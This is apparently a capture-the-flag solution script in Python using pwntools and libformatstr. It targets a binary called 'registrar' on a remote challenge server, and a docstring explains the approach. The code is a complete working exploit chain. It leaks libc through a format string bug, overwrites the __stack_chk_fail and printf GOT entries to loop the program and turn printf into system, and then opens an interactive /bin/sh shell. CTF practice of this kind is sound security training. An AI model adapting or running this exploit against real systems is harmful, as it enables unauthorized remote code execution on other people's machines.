#!/usr/bin/env python2

"""
64-byte buffer that's read() from the user then sent straight to printf().
Format string vulnerability, followed by a call to gets(). I suppose you
could leak the cookie with the format string and then smash the stack with
gets, but I did it all with format string vuln.

The 64-byte buffer added some difficulty since libformatstr will generate
payloads that are too large when trying to write a 64-bit value. We can
however do smaller partial overwrites. Overwriting __stack_chk_fail with the
address of main() will allow us to "restart" the program and conduct multiple
writes. After doing this, printf() should already be resolved, and we can just
overwrite the low 32 bites to turn it into system.

I tried doing stage 2 and stage 3 combined by overwriting gets(), however the
address of gets.got actually contains a backtick byte. When system gets
invoked with '/bin/sh;' followed by the format string, it will blow up due to
a bad backtick format. Overwriting printf instead of gets allows us to loop
back around for a third stage and pop a shell.

ASLR was off on the challenge server as stated in the problem, so we can use
two connections to leak libc base. However, this problem is still solvable with
ASLR on if we use the above technique to execute multiple format string
exploits over a single connection.
"""

from libformatstr import FormatStr
from pwn import *

elf = ELF("./registrar")
libc = ELF("./libc.so")

#context.log_level = "debug"

def connect():
    #return process("./registrar")
    return remote("challenge.acictf.com", 61713)


def get_libc_base():
    """Leak the address of puts and compute libc base from there."""
    payload = "%11$s" + "a"*3 + p64(elf.got["puts"])
    conn = connect()
    conn.recvuntil("code name:\n")
    conn.send(payload)

    conn.recvuntil("code name: \n")
    leak = conn.recvuntil("aaa", drop=True)
    conn.close()

    leak += "\x00" * (8 - len(leak)) # pad to 8 bytes
    puts_addr = u64(leak)
    log.info("libc puts: 0x{:x}".format(puts_addr))
    return puts_addr - libc.symbols["puts"]


def main():
    log.info("Leaking libc base")
    libc.address = get_libc_base()
    log.info("libc base  : 0x{:x}".format(libc.address))
    log.info("libc system: 0x{:x}".format(libc.symbols["system"]))
    log.info("main       : 0x{:x}".format(elf.symbols["main"]))
    log.info("gets.got   : 0x{:x}".format(elf.got["gets"]))
    log.info("__stack_chk_fail.got: 0x{:x}".format(elf.got["__stack_chk_fail"]))

    conn = connect()

    # stage 1 - allow the loader to resolve gets()
    # Overwrite __stack_chk_fail with main to restart the program
    log.info("Overwriting __stack_chk_fail with main")
    p = FormatStr(isx64=1)
    p[elf.got["__stack_chk_fail"]] = elf.symbols["main"]
    payload = p.payload(10)
    log.info(hexdump(payload))

    conn.recvuntil("code name:\n")
    conn.send(payload)
    conn.recvuntil("password for code name: ")
    conn.sendline("a"*200)  # Restart the program

    # stage 2 - partial overwrite of printf() to turn it into system()
    log.info("Overwriting printf with system")
    p = FormatStr(isx64=1)
    p[elf.got["printf"]] = libc.symbols["system"]
    payload = p.payload(10)
    log.info(hexdump(payload))

    conn.recvuntil("code name:\n")
    conn.send(payload)
    conn.recvuntil("password for code name: ")
    conn.sendline("a"*200)  # Restart the program

    # stage 3 - send /bin/sh now that printf() is system()
    log.info("Sending /bin/sh")
    conn.recvuntil("code name:\n")
    conn.sendline("/bin/sh")
    conn.recvuntil("code name: \n")
    conn.interactive()


if __name__ == "__main__":
    main()
